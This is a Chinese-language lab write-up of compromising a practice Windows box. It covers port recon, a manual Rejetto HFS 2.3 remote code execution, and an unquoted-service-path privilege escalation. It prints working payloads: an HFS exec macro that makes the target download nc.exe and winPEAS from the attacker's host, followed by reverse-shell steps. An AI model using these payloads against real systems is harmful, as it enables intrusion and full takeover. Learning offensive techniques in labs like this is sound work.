这次的write-up不是一份tryhackme-walkthrough的copy，是记录我自己的思路，过程中会有许多的报错。
# **Recon:**
### *Port 80 (HTTP)*
- ***80/tcp open http Microsoft IIS httpd 8.5**: 运行着 **IIS 8.5**（Internet Information Services，微软的 Web 服务器）。这是 Windows Server 2012 的标配。*
- ***|http-csrf / |_http-stored-xss / |_http-dombased-xss*: Nmap 的默认脚本没有发现常见的 Web 漏洞。*
- ***|http-server-header: Microsoft-IIS/8.5*: 服务器响应头确认了版本。*
### *Port 135, 139, 445 (The Windows Trinity)*
- ***135/tcp open msrpc**: **MSRPC**（Microsoft Remote Procedure Call）。用于让不同的进程在网络中互相通信。*
- ***139/tcp open netbios-ssn**: **NetBIOS**（Network Basic Input/Output System）。老旧的会话层协议，用于局域网内的命名和通信。*
- ***445/tcp open microsoft-ds**: **SMB**（Server Message Block）。这是最重要的端口，用于文件共享和打印机共享。扫描结果显示它运行在 Windows Server 2008 R2 - 2012 之间*
### *Port 3389 (RDP)*
- ***3389/tcp open ms-wbt-server**: **RDP**（Remote Desktop Protocol，远程桌面协议）。*
- ***ssl-dh-params: VULNERABLE**: **Critical Hit!** 这里的 **Diffie-Hellman (DH)** 密钥交换存在缺陷。*
    - ***WEAK DH GROUP 1**: 它使用了过时的 1024 位长度（Modulus Length: 1024）。在 2026 年，这种强度已经可以被 **Passive Eavesdropping**（被动窃听）破解。*
### *Port 5985 (WinRM)*
- ***5985/tcp open http**: **WinRM**（Windows Remote Management）。这是管理员进行远程命令行管理的合法通道。如果你拿到凭据，这通常是 **Initial Access**（初始访问）的首选。*
### *Port 8080 (The "Juicy" Part)*
- ***8080/tcp open http HttpFileServer httpd 2.3**: 运行着 **HFS 2.3**（Rejetto HttpFileServer）。*
    - ***Punchline: This is your golden ticket!** HFS 2.3 存在著名的 **Remote Code Execution (RCE)** 漏洞。*
- ***http-method-tamper: VULNERABLE (Exploitable)**: **HTTP Verb Tampering**（HTTP 动词篡改）。攻击者可以通过改变请求方法（如从 GET 变为 POST 或其他非法动词）来绕过认证。*
- ***http-vuln-cve2011-3192**: 一个针对 Apache 的旧漏洞，可能在这里是误报，或者该 HFS 使用了受影响的组件。*
### *Ephemeral Ports (49152 - 49156)*
- *这些是 Windows 系统动态分配的高位端口，通常用于 **RPC**（远程过程调用）处理具体的通信任务。*

看到这些端口，我第一时间注意到的是运行着web server的port80和port8080，我们可以使用浏览器直接去看看这两个端口到底跑着什么：
我们先看看：http://10.48.191.123:80
![image](1.jpg)
这个网页展示了一张本月最佳员工的照片，我们可以把照片下载下来，使用==`exiftool`==看看照片的元数据里面是否有信息：
==`└─➤ exiftool BillHarper.png`==
`ExifTool Version Number         : 13.36`
`File Name                       : BillHarper.png`
`Directory                       : .`
`File Size                       : 750 kB`
`File Modification Date/Time     : 2026:01:07 20:39:02+08:00`
`File Access Date/Time           : 2026:01:09 07:43:43+08:00`
`File Inode Change Date/Time     : 2026:01:07 20:39:02+08:00`
`File Permissions                : -rw-rw-r--`
`File Type                       : PNG`
`File Type Extension             : png`
`MIME Type                       : image/png`
`Image Width                     : 661`
`Image Height                    : 661`
`Bit Depth                       : 8`
`Color Type                      : RGB with Alpha`
`Compression                     : Deflate/Inflate`
`Filter                          : Adaptive`
`Interlace                       : Noninterlaced`
`SRGB Rendering                  : Perceptual`
`Gamma                           : 2.2`
`Image Size                      : 661x661`
`Megapixels                      : 0.437`
这里可以看到员工的名字：Bill Harper，不过没有其他的特殊信息。

接下来我们看看：http://10.48.191.123:8080/
![image](2.jpg)
这个端口的网页跑得是httpfileserver服务，管理员可以通过登录远程对服务器的文件进行上传，查询等操作，既然我们拿到了Bill Harper的名字，我们可以考虑使用burpsuite对登录进行一下爆破。另外，针对这个httpfileserver的版本，我们可以是看看有没有现成可以利用的exploit：
==`└─➤ searchsploit httpfileserver`==  
`-------------------------------------------------------- ------------------------`
 `Exploit Title                                          |  Path`
`-------------------------------------------------------- ------------------------`
`Rejetto HttpFileServer 2.3.x - Remote Command Execution | windows/webapps/49125.py`
`-------------------------------------------------------- ------------------------`
`Shellcodes: No Results`
针对这个版本的httpfileserver还真有一个现成可以利用的漏洞，我们可以使用msf或者手动对这个漏洞进行利用。

第三个攻击向量就是port445,这个端口运行这smb文件共享服务，我们可以使用==`smbclient`==看看共享文件里面是否有泄漏的文件配置以供我们在横向中移动：
==`└─➤ smbclient -L //10.48.191.123/`==
`Password for [WORKGROUP\sm]:`
`session setup failed: NT_STATUS_ACCESS_DENIED`
看来目标并没有配置允许anonymous登录。

那么接下来的思路就很明确了，我们要针对rejetto hhtpfileserver 2.3.5这个版本的web server进行爆破和漏洞利用

# **Access:**
我们先使用burpsuite来抓包：
`GET /~login HTTP/1.1`
`Host: 10.48.191.123:8080`
`Cache-Control: max-age=0`
`Authorization: Basic QmlsbEhhcnBlcjpCaWxsSGFycGVy`
`Accept-Language: en-US,en;q=0.9`
`Upgrade-Insecure-Requests: 1`
`User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`
`Referer: http://10.48.191.123:8080/`
`Accept-Encoding: gzip, deflate, br`
`Cookie: HFS_SID=0.994508726987988`
`Connection: keep-alive`
这是在登录时发送的get请求，我是以billharper：123456的数据登录的，但我们并不能在get包里面看到任何的数据上传，很明显这条路也行不通。

接下来我们就来使用自动化工具metasploit：
![image](3.jpg)
大概思路是：在本机的port80运行一个webserver，然后发送payload让目标连接到这个端口下载一个nc.exe。接着再发送一个payload让目标执行命令，连接到本机的的4444端口（在本地提前使用nc在4444端口监听），这样就获得了一个远程的shell，我们来看看msf自动化的运行结果：
![image](4.jpg)
很难受，但在自动化过程中，问题是比较难定位的，我们现在手动来实现一遍攻击逻辑，在这之前，需要在本地拿到exploit脚本以及一个nc.exe的二进制文件，由于github上的许多链接都已经过时了，这里推荐一个链接：https://eternallybored.org/misc/netcat/
首先我们在带有nc.exe文件的位置开启一个webserver，让目标可以通过这个端口下载nc.exe，然后使用nc监听4444端口，让目标回连。
![image](5.jpg)
![image](6.jpg)
接下来我们开始发送payload，同时观察80端口的状态：
![image](7.jpg)

结果port80没有任何反映，说明有两种可能，要么是指令有问题，要么是payload根本就没有送到，大概率是前一种，certuil是windows自带的一个下载工具，下面我们使用powershell命令来试试：
![image](8.jpg)
但是80端口还是没反映，我们看看能不能ping通目标：
![image](9.jpg)
这表明本机与目标的连接没有问题，那接下来我们继续排查：
**Exploit 语法不匹配**、**防火墙拦截（Outbound Filtering）** 或 **HFS 服务假死**：
我们先来看看exploit到底能不能正确执行，先使用tcpdump监控所有发向tun0的所有icmp包，然后让目标ping过来：
![image](12.jpg)
![image](13.jpg)
还是没有任何流量发过来，那就说明exploit根本就没有正确执行。
为了验证rce漏洞真的存在，我们直接访问：http://10.48.191.123:8080/?search=%00{.exec|cmd.exe /c ping -n 1 192.168.129.242.}：
![image](14.jpg)
这下我们终于看到了梦寐以求的流量回包，这验证了漏洞确实存在，问题处在我们的payload上，一定是格式处理不当，使得宏命令没有正确的传达。那原因就有很多中可能了，可能是 python的版本问题，还是hfs对命令的特殊要求。。。我们这里就直接使用浏览器来发送载荷：
`%00{.exec|powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.129.242/nc.exe','nc.exe')".}`
这次我们在port80上看到了想要的回应：
![image](15.jpg)
接下来我们就可以执行下一次payload，让目标运行nc.exe回连我们监听的4444端口：
![image](16.jpg)
pwned，我们终于拿到了shell！！！！！！！！！！！

# Escalation：
接下来我们使用winpeas来进行分析：
首先先把winpeas下载到我们本地：
`wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe`
然后在靶机上把这个exe文件下过去：
`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.129.242:80/winPEASx64.exe', 'C:\Windows\Temp\winPEAS.exe')"`
然后我们在靶机上运行winpeas，由于他的输出结果非常多，我们这里就只看service部分：
`winPEAS.exe servicesinfo`
![image](17.jpg)

==**漏洞原理图解：**==
==当你（或者系统）告诉 Windows 启动这个服务时，Windows 接收到的是一串字符。如果没有引号告诉它“这是一个完整的整体”，Windows 就会困惑：**“哪里是可执行文件的结束？哪里是参数的开始？”**==
==为了解决这个困惑，Windows 会按照**从左到右**的顺序，遇到空格就停下来，尝试加上 `.exe` 看看这个文件存不存在。==
==**系统会按以下顺序依次尝试寻找并执行文件：**==
1. ==**尝试 1：** 读取到第一个空格：`C:\Program` 系统动作：检查 `C:\` 下有没有叫 **`Program.exe`** 的文件？==
    - ==如果有：**执行它！**（不管后面的 `Files (x86)...` 是什么，都当做参数）。==
    - ==如果没有：继续往下读。==
2. ==**尝试 2：** 读取到第二个空格（在 `Advanced SystemCare` 里的空格）： 路径拼接为：`C:\Program Files (x86)\IObit\Advanced` 系统动作：检查 `C:\Program Files (x86)\IObit\` 下有没有叫 **`Advanced.exe`** 的文件？==
    - ==如果有：**执行它！** 👈 **这就是我们攻击的地方！**==
    - ==如果没有：继续往下读。==
3. ==**尝试 3（最终）：** 读取完整路径：`C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` 系统动作：找到了真正的服务程序，执行它。==

    
==**利用了写权限（关键）：** `winPEAS` 告诉我们，当前用户 `bill` 对 `C:\Program Files (x86)\IObit\` 这个目录拥有**写入权限**。==
==于是，我们将木马命名为 **`Advanced.exe`** 并放在 `IObit` 目录下。当服务重启时，Windows 走到“尝试 2”这一步，发现了我们的文件，误以为它是服务程序，于是就以 SYSTEM 权限运行了它，而把真正的服务文件扔到了一边。==

这里我们使用msfvenom生成一个反向shell的木马：
![image](18.jpg)
![image](19.jpg)
接下来我们把这个文件放到目标文件夹下面：
![image](20.jpg)
然后我们在本机上再开一个监听端口：
![image](21.jpg)
在目标机器上重启服务：
`sc stop AdvancedSystemCareService9`
`sc start AdvancedSystemCareService9`
接着我们就拿到了最高权限：
![image](22.jpg)

总结：当自动化走不通的时候，回归手动往往是更好的选择，通关观察了解漏洞的原理，拆分攻击的具体步骤，不仅能加深对于该漏洞的理解，也有助于精确定位操作的失误点。